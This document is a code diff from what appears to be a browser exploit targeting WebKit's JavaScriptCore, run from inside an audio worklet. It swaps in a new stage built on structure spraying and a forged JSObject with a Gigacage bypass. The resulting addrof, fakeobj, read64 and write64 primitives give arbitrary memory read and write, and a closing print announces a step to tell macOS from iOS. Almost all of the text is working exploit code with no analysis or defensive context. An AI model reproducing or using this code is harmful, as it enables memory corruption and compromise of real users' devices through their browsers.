@@ -551,103 +551,127 @@ b.process = (inputs, outputs, parameters)=>{
 	      var print = (msg) => {
 		      fuck.port.postMessage(msg);
 	      }
-	      var structs = []
-    for (var i = 0; i < 0x1000; ++i) {
-        var array = [13.37];
-        array.pointer = 1234;
-        array['prop' + i] = 13.37;
-        structs.push(array);
+	      var structure_spray = []
+for (var i = 0; i < 1000; ++i) {
+    var ary = [13.37];
+    ary.prop = 13.37;
+    ary['p'+i] = 13.37;
+    structure_spray.push(ary);
+}
+
+var unboxed_size = 100;
+
+var convert = new ArrayBuffer(0x10);
+var u32 = new Uint32Array(convert);
+var u8 = new Uint8Array(convert);
+var f64 = new Float64Array(convert);
+var BASE = 0x100000000;
+
+
+function i2f(i) {
+    u32[0] = i%BASE;
+    u32[1] = i/BASE;
+    return f64[0];
+}
+
+function f2i(f) {
+    f64[0] = f;
+    return u32[0] + BASE*u32[1];
+}
+
+function unbox_double(d) {
+    f64[0] = d;
+    u8[6] -= 1;
+    return f64[0];
+}
+	    var victim = structure_spray[510];
+
+    // Gigacage bypass: Forge a JSObject which has its butterfly pointing
+    // to victim
+    u32[0] = 0x200;
+    u32[1] = 0x01082007 - 0x10000;
+    var flags_double = f64[0];
+
+    u32[1] = 0x01082009 - 0x10000;
+    var flags_contiguous = f64[0];
+
+    var array_spray = [];
+    for (var i = 0; i < 1000; ++i) {
+        array_spray[i] = [13.37+i, 13.37];
     }
-	    var victim = structs[0x800];
-	      // take an array from somewhere in the middle so it is preceeded by non-null bytes which
-    // will later be treated as the butterfly length.
-    //var victim = structs[0x800];
-    print("[+] victim @ " + addrof(victim));
+    var unboxed = eval(`[${'13.37,'.repeat(unboxed_size)}]`);
+    unboxed[0] = 4.2; // no CopyOnWrite
 
-    // craft a fake object to modify victim
-    var flags_double_array = 0x0108200700001000 - 0x02000000000000;
-    var container = {
-        header: flags_double_array,
-        butterfly: victim
+    var boxed = [{}];
+    //print(`unboxed @ ${hex(stage1.addrof(unboxed))}`);
+    //print(`boxed @ ${hex(stage1.addrof(boxed))}`);
+
+    var outer = {
+        header: flags_contiguous, // cell
+        butterfly: victim, // butterfly
     };
+    //print(`outer @ ${hex(stage1.addrof(outer))}`);
 
-    // create object having |victim| as butterfly.
-    var containerAddr = addrof(container);
-    print("[+] container @ " + containerAddr);
-    // add the offset to let compiler recognize fake structure
-    var hax = fakeobj(containerAddr - 0x8);
-    // origButterfly is now based on the offset of **victim** 
-    // because it becomes the new butterfly pointer
-    // and hax[1] === victim.pointer
-    var origButterfly = hax[1];
+    var hax = fakeobj(addrof(outer) + 0x10);
 
-    var memory = {
-        addrof: addrof,
-        fakeobj: fakeobj,
+    hax[1] = unboxed;
+    var shared_butterfly = f2i(victim[1]);
+    //print(`shared butterfly @ ${hex(shared_butterfly)}`);
+    hax[1] = boxed;
+    victim[1] = i2f(shared_butterfly);
 
-        // Write an int64 to the given address.
-        writeInt64: function(addr, int64) {
-            hax[1] = Add(addr, new Int64(0x10)).asDouble();
-            victim.pointer = int64;
+    outer.header = flags_double;
+
+    var stage2 = {
+        addrof: function(victim) {
+            boxed[0] = victim;
+            return f2i(unboxed[0]);
         },
 
-        // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
-        write16: function(addr, value) {
-            // Set butterfly of victim object and dereference.
-            hax[1] = Add(addr, new Int64(0x10)).asDouble();
-            victim.pointer = value;
+        fakeobj: function(addr) {
+            unboxed[0] = i2f(addr);
+            return boxed[0];
         },
 
-        // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
-        write: function(addr, data) {
-            while (data.length % 4 != 0)
-                data.push(0);
-
-            var bytes = new Uint8Array(data);
-            var ints = new Uint16Array(bytes.buffer);
-
-            for (var i = 0; i < ints.length; i++)
-                this.write16(Add(addr, 2 * i), ints[i]);
+        write64: function(where, what) {
+            hax[1] = i2f(where + 0x10);
+            victim.prop = this.fakeobj(what);
         },
 
-        // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
-        read64: function(addr) {
-            // Set butterfly of victim object and dereference.
-            hax[1] = Add(addr, new Int64(0x10)).asDouble();
-            //return this.addrof(victim.pointer);
-            return this.addrof(victim.pointer);
+        read64: function(where) {
+            hax[1] = i2f(where + 0x10);
+            return this.addrof(victim.prop);
         },
-        read: function(addr, length) {
-            var a = new Array(length);
-            var i;
 
-            for (i = 0; i + 8 < length; i += 8) {
-                v = this.read64(addr + i).bytes()
-                for (var j = 0; j < 8; j++) {
-                    a[i+j] = v[j];
-                }
+        test: function() {
+            var addr = this.addrof({a: 0x1337});
+            var x = this.fakeobj(addr);
+            if (x.a != 0x1337) {
+                print('stage2 addrof/fakeobj does not work');
             }
 
-            v = this.read64(addr + i).bytes()
-            for (var j = i; j < length; j++) {
-                a[j] = v[j - i];
+            var val = 0x42424242;
+            this.write64(shared_butterfly + 8, 0x42424242);
+            if (i2f(val) != unboxed[1]) {
+                print('stage2 write does not work');
             }
 
-            return a
+            if (this.read64(shared_butterfly + 8) != 0x42424242) {
+                print('stage2 read does not work');
+            }
         },
-        read_i64: function(addr) {
-            return new Int64(this.read64(addr));
+
+        clear: function() {
+            outer = null;
+            hax = null;
+            for (var i = 0; i < unboxed_size; ++i)
+                boxed[i] = null;
+            boxed = null
+            unboxed = null
         },
     };
 
-    // Testing code, not related to exploit
-    var plainObj = {};
-    var header = memory.read64(addrof(plainObj));
-    memory.writeInt64(memory.addrof(container), header);
-	    
-    //memory.test();
-    //let memory.read_i64 = memory.read64;
-     
+    stage2.test();
     print("[+] arbitrary memory read/write working");
 	    print("now about to find out whether this exploit is running on mac or ios with function signatures...");
 	    
